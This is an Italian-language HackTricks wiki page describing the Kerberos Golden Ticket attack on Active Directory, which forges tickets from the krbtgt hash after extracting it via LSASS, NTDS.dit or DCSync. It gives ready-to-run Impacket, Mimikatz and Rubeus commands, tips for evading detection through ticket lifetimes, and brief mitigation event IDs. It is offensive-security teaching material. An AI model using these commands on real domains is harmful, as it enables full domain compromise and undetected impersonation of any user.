# Golden Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Golden ticket

Un attacco **Golden Ticket** consiste nella **creazione di un Ticket Granting Ticket (TGT) legittimo impersonando qualsiasi utente** attraverso l'uso dell'**hash NTLM dell'account krbtgt di Active Directory (AD)**. Questa tecnica è particolarmente vantaggiosa perché **consente l'accesso a qualsiasi servizio o macchina** all'interno del dominio come utente impersonato. È fondamentale ricordare che le **credenziali dell'account krbtgt non vengono mai aggiornate automaticamente**.

Per **acquisire l'hash NTLM** dell'account krbtgt, possono essere impiegati vari metodi. Può essere estratto dal **processo Local Security Authority Subsystem Service (LSASS)** o dal **file NT Directory Services (NTDS.dit)** situato su qualsiasi Domain Controller (DC) all'interno del dominio. Inoltre, **eseguire un attacco DCsync** è un'altra strategia per ottenere questo hash NTLM, che può essere eseguita utilizzando strumenti come il **modulo lsadump::dcsync** in Mimikatz o lo **script secretsdump.py** di Impacket. È importante sottolineare che per intraprendere queste operazioni, **sono tipicamente richiesti privilegi di amministratore di dominio o un livello di accesso simile**.

Sebbene l'hash NTLM serva come metodo valido per questo scopo, è **fortemente raccomandato** di **forgiare ticket utilizzando le chiavi Kerberos Advanced Encryption Standard (AES) (AES128 e AES256)** per motivi di sicurezza operativa.

{% code title="From Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Da Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Una volta** che hai **iniettato il Golden Ticket**, puoi accedere ai file condivisi **(C$)** ed eseguire servizi e WMI, quindi potresti usare **psexec** o **wmiexec** per ottenere una shell (sembra che non puoi ottenere una shell tramite winrm).

### Bypassare le rilevazioni comuni

I modi più frequenti per rilevare un golden ticket sono **ispezionando il traffico Kerberos** sulla rete. Per impostazione predefinita, Mimikatz **firma il TGT per 10 anni**, il che risalterà come anomalo nelle successive richieste TGS effettuate con esso.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Usa i parametri `/startoffset`, `/endin` e `/renewmax` per controllare l'offset di inizio, la durata e il numero massimo di rinnovi (tutti in minuti).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Sfortunatamente, la durata del TGT non è registrata nei 4769, quindi non troverai queste informazioni nei registri eventi di Windows. Tuttavia, ciò che puoi correlare è **vedere i 4769 senza un precedente 4768**. Non è **possibile richiedere un TGS senza un TGT**, e se non c'è traccia di un TGT emesso, possiamo dedurre che è stato falsificato offline.

Per **bypassare questo controllo di rilevamento**, controlla i diamond tickets:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Mitigazione

* 4624: Accesso all'account
* 4672: Accesso come amministratore
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Altri piccoli trucchi che i difensori possono fare è **allertare sui 4769 per utenti sensibili** come l'account amministratore di dominio predefinito.

## Riferimenti
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
